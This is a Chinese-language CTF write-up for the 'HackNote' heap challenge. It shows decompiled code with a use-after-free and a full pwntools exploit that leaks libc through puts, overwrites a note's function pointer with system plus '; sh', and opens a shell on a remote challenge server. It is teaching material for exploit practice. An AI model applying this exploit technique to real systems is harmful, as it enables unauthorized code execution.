# HackNote

## 来源
World of Attack & Defense


## 难度

4 / 10

## 保护

 ```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
 ```

## 简单描述

相对比较简单的堆利用题目, 保护机制比较少,涉及知识点也比较少...

## vul

```c
unsigned int rm()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= dword_804A04C )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[v1] )
  {
    free(*((void **)ptr[v1] + 1));
    free(ptr[v1]); //释放后没有让指针数组清空
    puts("Success");                            // not set null
  }
  return __readgsdword(0x14u) ^ v3;
}
... ...
    

//打印函数
unsigned int puts_0()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= dword_804A04C )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[v1] )
     //vul 可以在堆中修改实现控制eip
    (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]); //若没释放会调用 addputs函数
  return __readgsdword(0x14u) ^ v3;
}

int __cdecl addputs(int a1)
{
  return puts(*(const char **)(a1 + 4));
}
```



## 知识点

堆的基本利用

## 思路

使用UAF漏洞实现和在堆中调用指针函数漏洞来实现获取libc基址,获取system地址,再次使用UAF修改该指针打印调用system获得shell



## 利用

### 获取libc基址

```python
	ad(0x10, 'A')
	ad(0x10, 'B')
	rm(0)
	rm(1)

	dump_addr = 0x0804862B
	ad(0x8, p32(dump_addr) + p32(exe.got['puts']))
	dp(0)
	puts_addr = u32(r(4))
	li('puts_addr: ' + hex(puts_addr))
	libc = LibcSearcher('puts', puts_addr)
	libc_base = puts_addr - libc.dump('puts')
	sys_addr = libc_base + libc.dump('system')
```

### getshell

通过修改函数指针为system获得shell

```python
	# get shell
	rm(2)
	ad(0x8, p32(sys_addr) + '; sh')
	dp(0)
```





## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "hacknote"
libFile  = ""

remoteIp = "111.198.29.45"
remotePort = 32693

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, text):
	sa('Your choice :', str(1))
	sa('Note size :', str(size))
	sa('Content :', text)

def rm(index):
	sa('Your choice :', str(2))
	sa(':', str(index))

def dp(index):
	sa('Your choice :', str(3))
	sa(':', str(index))	

def q():
	sa('Your choice :', str(4))

#--------------------------Exploit--------------------------
def exploit():
	#li(rl())
	ad(0x10, 'A')
	ad(0x10, 'B')
	rm(0)
	rm(1)

	dump_addr = 0x0804862B
	ad(0x8, p32(dump_addr) + p32(exe.got['puts']))
	dp(0)
	puts_addr = u32(r(4))
	li('puts_addr: ' + hex(puts_addr))
	libc = LibcSearcher('puts', puts_addr)
	libc_base = puts_addr - libc.dump('puts')
	sys_addr = libc_base + libc.dump('system')
	# get shell
	rm(2)
	ad(0x8, p32(sys_addr) + '; sh')
	dp(0)

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
```

